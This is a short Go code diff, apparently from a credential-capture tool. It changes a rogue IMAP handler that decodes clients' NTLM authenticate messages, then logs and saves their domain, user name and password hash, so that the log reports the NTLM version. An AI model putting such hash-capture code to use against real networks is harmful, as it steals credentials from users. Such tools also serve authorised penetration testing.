@@ -94,9 +94,9 @@ func HandleIMAP(c net.Conn) {
 			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
 			ntlm3 := core.FindNTLMSSP(raw3)
 			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
-				hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
+				hash, user, domain, ntlmVer, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					core.LogSuccess("[IMAP] NTLMv2 captured from %s", c.RemoteAddr())
+					core.LogSuccess("[IMAP] %s captured from %s", ntlmVer, c.RemoteAddr())
 					core.LogSuccess("       %s\\%s", domain, user)
 					core.LogSuccess("       %s", hash)
 					core.SaveHash(hash)
